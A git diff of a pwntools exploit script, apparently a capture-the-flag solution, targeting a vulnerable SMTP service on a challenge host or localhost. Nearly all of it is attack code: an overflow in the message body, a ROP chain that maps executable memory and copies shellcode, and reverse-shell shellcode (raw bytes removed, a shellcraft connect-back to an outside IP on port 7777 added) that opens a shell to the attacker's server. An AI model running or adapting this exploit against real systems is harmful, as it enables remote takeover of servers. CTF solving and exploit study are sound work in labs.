@@ -1,5 +1,5 @@
-# import smtplib
-from pwn import remote, p32
+from pwn import remote, p32, shellcraft, asm, context, args
+from pwnlib.util.cyclic import cyclic_gen
 
 """
 * Rop start @ 0x8049542 <handle_smtp+929> ret
@@ -105,30 +105,32 @@ MAP_SHARED = 1
 MAP_PRIVATE = 2
 MAP_ANONYMOUS = 0x20
 
+context(arch="i386", os="linux", endian="little")
+
 # Setup connection and so on
-p = remote("smtp-666mww.inst.malicecyber.com", 4444)
-# p = remote("localhost", 4444)
+if args["REMOTE"]:
+    p = remote("smtp-666mww.inst.malicecyber.com", 4444)
+else:
+    p = remote("localhost", 4444)
 p.send(b"HELO\r\n")
 print(p.recv())
+
 p.send(b"MAIL FROM: <auteur@yyyy.yyyy>\r\n")
 print(p.recv())
+
 p.send(b"RCPT TO: <dga-mi-bruz.recrutement.fct@intradef.gouv.fr>\r\n")
 print(p.recv())
+
 p.send(b"DATA\r\n")
 print(p.recv())
 
-# Pwn all ze komputerz
-p.send(
-    b"Subject: Test\r\n\r\n"
-    # Size of b"AAAABBBBCCCCDDDD\r\n", 18 bytes
-    + b"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\r\n"
-    + b"AAAABBBBCCCCDDDD\r\n" * 55
-    + b"PADDING_LOL"
-    #
-    # Allocate a new memory location with proper permissions with mmap()
-    #
-    + p32(MMAP)
-    + p32(STACK_NIBBLER)  # comsumes mmap arguments on the stack + 1
+p.send(b"Subject: Test\r\n")
+p.send(b"\r\n")
+
+ropchain = b""
+ropchain += (
+    p32(MMAP)
+    + p32(STACK_NIBBLER)  # consumes mmap arguments on the stack + 1
     + p32(0x00000000)  # void *addr
     + p32(0x00001000)  # size_t len
     + p32(PROT_READ | PROT_WRITE | PROT_EXEC)  # int prot
@@ -152,30 +154,29 @@ p.send(
     # Setup memcpy parameters
     #
     + p32(POP_EBX)
-    + p32(0x1337)
+    + p32(0x1000)
     #
     # Copy shellcode to allocated memory
     #
     + p32(POP_EDI)
     + p32(MEMCPY)
     + p32(PUSHA)
-    #############################
     #
-    # Spill registers on the stack to fetch the pointer in eax into ebp
-    #
-    # + p32(0xCCCCCCCC)
     # Reverse shell on VPS
-    + b"\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a"
-    + b"\x02\x89\xe1\xcd\x80\x96\x31\xc0\x43\x68\x33\x4b"
-    + b"\xa0\x1e\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10"
-    + b"\x51\x56\x89\xe1\x43\xb0\x66\xcd\x80\x87\xde\x31"
-    + b"\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31"
-    + b"\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
-    + b"\x89\xe3\xb0\x0b\x31\xc9\xcd\x80"
-    + b"\r\n"
-    + b"XXXXSHELLCODE????\r\n"
-    + b".\r\n"
+    #
+    + b"\x90" * 128
+    + asm(
+        shellcraft.i386.linux.connect("51.75.160.30", 7777, "ipv4")
+        + shellcraft.i386.linux.findpeersh(7777)
+    )
 )
 
-print(p.recv())
+g = cyclic_gen()
+p.send(g.get(1023) + ropchain + b"\r\n")
+
+p.send(b".\r\n")  # End of text
+
+p.send(b"RSET\r\n")
+p.send(b"QUIT\r\n")
+
 p.interactive()
